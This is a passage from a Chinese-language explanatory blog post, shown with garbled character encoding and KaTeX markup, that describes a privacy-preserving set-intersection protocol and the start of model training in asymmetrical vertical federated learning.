mtight"><span class="mord mathrm mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºçš„æ˜¯IDçš„æ˜æ–‡ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">U</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathrm{U}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºçš„åŠ å¯†1æ¬¡çš„å¯†æ–‡ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="normal">U</mi><mi>i</mi><mo>â€ </mo></msubsup></mrow><annotation encoding="application/x-tex">\mathrm{U}_i^\dagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.2769em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">â€ </span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span></span></span> ä¸ºåŠ å¯†2æ¬¡çš„å¯†æ–‡ã€‚</p><p>åè®®æ€æƒ³è¾ƒä¸ºç®€å•ï¼Œæ ¸å¿ƒåœ¨äºç¬¬7æ­¥ä¸­ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¼šéšæœºé€‰æ‹©å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="normal">U</mi><mn>1</mn><mo lspace="0em" rspace="0em">â€ </mo></msubsup><mo>âˆ©</mo><msubsup><mi mathvariant="normal">U</mi><mn>2</mn><mo lspace="0em" rspace="0em">â€ </mo></msubsup><mo>âŠ‚</mo><msup><mi mathvariant="normal">U</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi><mo>â€ </mo></mrow></msup><mo>âŠ‚</mo><msubsup><mi mathvariant="normal">U</mi><mn>1</mn><mo>â€ </mo></msubsup></mrow><annotation encoding="application/x-tex">\mathrm{U}_{1}^{\dagger} \cap \mathrm{U}_{2}^{\dagger} \subset \mathrm{U}^{o b f \dagger} \subset \mathrm{U}_1^\dagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€ </span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€ </span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŠ‚</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8882em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mtight">â€ </span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŠ‚</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">â€ </span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span></span></span></span> ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">U</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi><mo>â€ </mo></mrow></msup></mrow><annotation encoding="application/x-tex">\mathrm{U}^{obf\dagger}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mtight">â€ </span></span></span></span></span></span></span></span></span></span></span></span>å¯¹åº”çš„æ˜æ–‡é™¤äº†åŒ…å«çœŸæ­£çš„äº¤é›†å¤–è¿˜åŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">I</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathrm{I}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸­çš„éƒ¨åˆ†æ•°æ®ï¼Œä½† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>âˆ©</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo>=</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo>âˆ©</mo><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1^o\cap \mathcal{I}_2^o =\mathcal{I}_{2}^{o} \cap \mathcal{I}^{obf}=\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çš„æ˜¯åç»­æ±‚äº¤è¿ç®—å‡†ç¡®æ€§çš„åŸºç¡€ã€‚</p><p>æ³¨æ„ï¼š<code>å®‰å…¨æ•°ï¼ˆsecure numberï¼‰</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span></span></span></span>è¢«è§£é‡Šä¸º<strong>æ¨¡ç³Šäº¤é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span></span></span></span></strong> ä¸<strong>çœŸå®äº¤é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong> çš„åŸºæ•°æ¯” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><mi>Î»</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">Î»</span><span class="mclose">)</span></span></span></span> ï¼Œè¯¦ç»†ä½œç”¨å¯çœ‹ç®—æ³•1ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ä»æ¨¡ç³Šäº¤é›†ä¸­éšæœºé€‰æ‹©ä¸€å…ƒç´ ï¼Œå…¶æ°å¥½ä½äºçœŸå®äº¤é›†çš„æ¦‚ç‡ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>h</mi><mo stretchy="false">(</mo><mi>Î»</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1/h(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">Î»</span><span class="mclose">)</span></span></span></span> ã€‚è¿›ä¸€æ­¥åœ°ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h(0)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> è¡¨ç¤ºçš„æ˜¯æ¨¡ç³Šäº¤é›†ä¸çœŸå®äº¤é›†å®Œå…¨ç›¸åŒï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1,\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ‹¥æœ‰çš„å…¨éƒ½æ˜¯çœŸå®äº¤é›†ï¼Œå³è¿™ç§ç‰¹æ®Šæƒ…å†µä¸‹AVFLå˜æˆäº†SVFLã€‚è€Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lambda=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> æ—¶å¯¹åº”çš„ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>=</mo><msup><mi mathvariant="script">I</mi><mn>1</mn></msup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}=\mathcal{I}^1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span>ï¼Œæ­¤æ—¶ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ— æ³•ä»ç®—æ³•1ä¸­è·å–ä»»ä½•ä¿¡æ¯ã€‚<br><strong>éšç€ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span></span></span></span> ä»0é€’å¢åˆ°1ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>h</mi><mo stretchy="false">(</mo><mi>Î»</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1/h(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">Î»</span><span class="mclose">)</span></span></span></span> æŒ‡æ•°é€’å‡ï¼Œå› æ­¤ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ›´éš¾ä»æ¨¡ç³Šäº¤é›†ä¸­åˆ†è¾¨å‡ºçœŸå®äº¤é›†ï¼Œæ›´å®‰å…¨</strong>ã€‚</p><h1 id="Asymmetrical-Federated-Model-Training">Asymmetrical Federated Model Training</h1><h2 id="Genuine-with-Dummy-Approcah">Genuine with Dummy Approcah</h2><p>å¦‚å›¾3æ‰€ç¤ºï¼Œçºµå‘è”é‚¦å­¦ä¹ å­¦ä¹ åŸŸä¸­ç°åœ¨åŒ…å«æœ‰<strong>ç©ºç™½ï¼ˆmarginï¼‰</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mi mathvariant="normal">/</mi><mtext>Â </mtext><msub><mi mathvariant="script">I</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}/\  \mathcal{I}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mord">/</span><span class="mspace">Â </span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯¹åº”çš„æ ·æœ¬ç¼ºå°‘å…¨éƒ¨çš„æ ‡ç­¾å’Œéƒ¨åˆ†ç‰¹å¾ã€‚è™½ç„¶è”é‚¦è¿ç§»å­¦ä¹ ä¸­å¯ä»¥é€šè¿‡<code>ç‰¹å¾è¡¨ç¤ºè¿ç§»ï¼ˆ 